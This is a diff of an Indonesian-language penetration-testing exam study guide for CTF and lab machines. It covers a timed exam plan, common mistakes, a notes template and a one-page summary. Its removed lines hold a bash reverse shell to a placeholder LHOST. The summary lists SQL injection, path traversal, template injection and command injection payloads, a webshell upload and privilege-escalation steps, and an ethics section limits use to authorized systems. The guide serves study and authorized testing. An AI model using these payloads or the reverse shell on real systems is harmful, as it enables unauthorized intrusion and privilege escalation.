-    nc -lvnp 4444
-    bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
-    python pty
+```text
+- cek setiap web port;
+- robots.txt;
+- directory enumeration;
+- tangkap parameter dan request.
+```
 
-E — ENUM
-    id
-    sudo -l
-    uname -a
-    SUID/SGID
-    getcap
-    cron
-    writable files
-    credential
-    internal service
-    LinPEAS
+## Menit 40–65 — Foothold
 
-P — PRIVESC
-    sudo → GTFOBins
-    SUID → GTFOBins + -p
-    capability
-    writable cron
-    weak permission
-    credential reuse
-    kernel terakhir
+```text
+- prioritaskan login, upload, parameter id/page, diagnostic;
+- konfirmasi dengan payload sederhana;
+- cari RCE;
+- buat reverse shell.
+```
 
-P — PROOF
-    id
-    hostname
+## Menit 65–90 — Local Enumeration
+
+```text
+- sudo;
+- SUID;
+- capabilities;
+- cron;
+- credential;
+- internal service;
+- LinPEAS.
+```
+
+## Menit 90–110 — Root
+
+```text
+- gunakan jalur termudah;
+- jangan mulai dari kernel;
+- verifikasi uid/euid 0.
+```
+
+## Menit 110–120 — Flag dan Proof
+
+```text
+- cari flag;
+- cat flag;
+- id;
+- hostname;
+- screenshot;
+- rapikan catatan.
 ```
 
 ---
 
-# 17. Catatan Etika dan Keamanan
+# 31. Kesalahan Umum
 
-Gunakan command dan payload pada:
+## Recon
 
-- laboratorium sendiri;
-- CTF;
-- mesin ujian;
-- sistem yang secara tertulis mengizinkan pengujian.
+```text
+- tidak scan -p-;
+- hanya fokus port 80;
+- lupa menyimpan output;
+- salah menentukan LHOST.
+```
 
-Jangan menjalankannya pada sistem publik atau organisasi tanpa otorisasi. Eksploit kernel, perubahan `/etc/passwd`, cron, dan SUID dapat merusak sistem. Pada lab, gunakan snapshot sebelum pengujian berisiko.
+## Web
+
+```text
+- tidak cek robots.txt;
+- tidak menangkap POST di Burp;
+- tidak mencari lokasi file upload;
+- tidak memeriksa parameter GET.
+```
+
+## SQLMap
+
+```text
+- URL tidak memiliki parameter;
+- salah memilih -p;
+- lupa --data untuk POST;
+- spasi setelah backslash;
+- langsung dump tanpa tahu database/tabel.
+```
+
+## Reverse Shell
+
+```text
+- listener belum aktif;
+- LHOST salah;
+- port berbeda;
+- quote rusak;
+- target tidak dapat callback.
+```
+
+## Enumeration
+
+```text
+- hanya menjalankan LinPEAS;
+- lupa sudo -l;
+- lupa getcap;
+- tidak cek permission script cron;
+- tidak enum ulang setelah pindah user.
+```
+
+## PrivEsc
+
+```text
+- kernel exploit terlalu cepat;
+- lupa -p pada SUID shell;
+- percaya semua temuan LinPEAS;
+- tidak verifikasi dengan id.
+```
+
+## Flag
+
+```text
+- hanya mencari flag.txt;
+- lupa /root, /home, /var/www, /opt;
+- menemukan file tetapi tidak cat;
+- screenshot tidak memuat isi flag.
+```
 
 ---
 
-# 18. Sumber
+# 32. Template Catatan Ujian
 
-- Repository: https://github.com/w4h4z/Pentest-Cheat-Sheet
-- Branch: `main`
-- Snapshot commit terbaru saat penyusunan: `b8c6c099c8ab06b2475472bac044ee3fb7d15186`
-- Disusun: 16 Juli 2026
-- Referensi tambahan yang disebut repositori:
-  - GTFOBins: https://gtfobins.github.io
-  - PEASS-ng/LinPEAS: https://github.com/peass-ng/PEASS-ng
-  - PentestMonkey Reverse Shell Cheat Sheet
-  - Revshells.com
+```markdown
+# Target
 
-> Materi ini merupakan ringkasan belajar. Selalu cocokkan command dengan sistem operasi, versi layanan, arsitektur, permission, dan ruang lingkup pengujian.
+- TARGET:
+- LHOST:
+- Hostname:
+- OS:
+- Kernel:
+
+# Ports
+
+| Port | Service | Version | Notes |
+|---:|---|---|---|
+
+# Web
+
+- Base URL:
+- Endpoint:
+- Parameter:
+- Login:
+- Upload path:
+- Credential:
+
+# Foothold
+
+- Vulnerability:
+- Detection:
+- Exploit:
+- Initial user:
+
+# Reverse Shell
+
+- Listener:
+- Payload:
+- TTY:
+
+# Local Enumeration
+
+- sudo:
+- SUID:
+- capabilities:
+- cron:
+- writable:
+- credential:
+- internal service:
+
+# Privilege Escalation
+
+- Finding:
+- Exploit:
+- Root verification:
+
+# Flag
+
+- Path:
+- Value:
+
+# Proof
+
+```bash
+id
+hostname
+cat <PATH_FLAG>
+```
+```
+
+---
+
+# 33. Ringkasan Satu Halaman
+
+```text
+DISCOVER
+  ip a
+  nmap -sn subnet
+
+SCAN
+  nmap -p- --min-rate 5000
+  nmap -sC -sV -pPORTS
+
+WEB
+  robots.txt
+  dirsearch / feroxbuster
+
+FOOTHOLD
+  SQLi   : ' OR '1'='1'-- -
+  LFI    : ../../../../etc/passwd
+  SSTI   : {{7*7}}
+  CMDi   : ; id
+  Upload : PHP webshell
+
+SQLMAP
+  detect → current-db → dbs → tables → dump
+
+SHELL
+  nc -lvnp 4444
+  bash reverse shell
+
+TTY
+  python pty
+
+ENUM
+  id
+  sudo -l
+  uname
+  SUID
+  SGID
+  getcap
+  cron
+  writable
+  credential
+  ss -tlnp
+  linpeas
+
+PRIVESC
+  credential
+  sudo
+  SUID
+  capability
+  cron
+  weak permission
+  kernel terakhir
+
+ROOT
+  id
+  whoami
+  hostname
+
+FLAG
+  /root
+  /home
+  /var/www
+  /opt
+  find flag/proof/root/user
+
+PROOF
+  id
+  hostname
+  cat flag
+```
+
+---
+
+# 34. Etika dan Ruang Lingkup
+
+Gunakan materi ini hanya pada:
+
+- mesin laboratorium pribadi;
+- CTF;
+- mesin ujian;
+- sistem dengan izin tertulis.
+
+Jangan menjalankan payload pada sistem publik atau milik organisasi tanpa otorisasi. Perubahan cron, SUID, `/etc/passwd`, dan kernel exploit dapat merusak sistem. Gunakan snapshot pada laboratorium sebelum menjalankan teknik berisiko.
